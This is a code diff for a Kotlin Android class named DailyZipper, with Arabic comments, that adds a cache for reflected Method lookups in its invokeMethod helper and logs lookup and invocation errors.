@@ -16,6 +16,7 @@ import java.io.File
 import java.io.FileInputStream
 import java.io.FileOutputStream
 import java.lang.ref.WeakReference
+import java.lang.reflect.Method
 import java.security.MessageDigest
 import java.text.SimpleDateFormat
 import java.util.*
@@ -31,6 +32,7 @@ import java.util.zip.ZipOutputStream
  * - جميع الدوال مغلقة بشكل صحيح (لا توجد أقواس ناقصة)
  * - دالة saveConfig صحيحة وتعمل دون أخطاء
  * - شرط telegram != null موجود في جميع الأماكن اللازمة
+ * ✅ تم إضافة تخزين مؤقت للـ Method في invokeMethod لتحسين الأداء
  */
 class DailyZipper(
     context: Context,
@@ -79,6 +81,9 @@ class DailyZipper(
 
     private val deviceTag: String by lazy { calculateDeviceTag() }
     private val config = HashMap<String, Any>()
+
+    // ✅ تخزين مؤقت للـ Method لتجنب البحث المتكرر
+    private val methodCache = mutableMapOf<String, Method>()
 
     companion object {
         private const val TAG = "DailyZipper"
@@ -839,18 +844,43 @@ class DailyZipper(
         } catch (_: Exception) {}
     }
 
+    /**
+     * استدعاء دالة على كائن عبر الانعكاس مع تخزين مؤقت للـ Method.
+     * ✅ تم إضافة methodCache لتجنب البحث المتكرر وتحسين الأداء.
+     */
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
         if (target == null) return null
-        return try {
-            val method = target.javaClass.methods.firstOrNull { it.name == methodName }
-                ?: return null
+
+        // مفتاح فريد للتخزين المؤقت
+        val key = "${target.javaClass.name}.$methodName(${args.size})"
+
+        // البحث في الكاش أولاً
+        var method = methodCache[key]
+        if (method == null) {
+            // البحث عن الدالة في الكلاس
+            method = target.javaClass.methods.firstOrNull { m ->
+                m.name == methodName && m.parameterTypes.size == args.size
+            }
+            if (method == null) {
+                writeLog("Method not found: $methodName with ${args.size} parameters")
+                return null
+            }
             method.isAccessible = true
+            methodCache[key] = method
+        }
+
+        return try {
             method.invoke(target, *args)
         } catch (e: Exception) {
-            invokeMethodFallback(target, methodName, *args)
+            writeLog("Method invocation error ($methodName): ${e.message}")
+            null
         }
     }
 
+    /**
+     * طريقة احتياطية للبحث عن الدالة في حال فشلت الطريقة الأساسية.
+     * تُستخدم كـ Fallback فقط.
+     */
     private fun invokeMethodFallback(target: Any?, methodName: String, vararg args: Any?): Any? {
         if (target == null) return null
         return try {
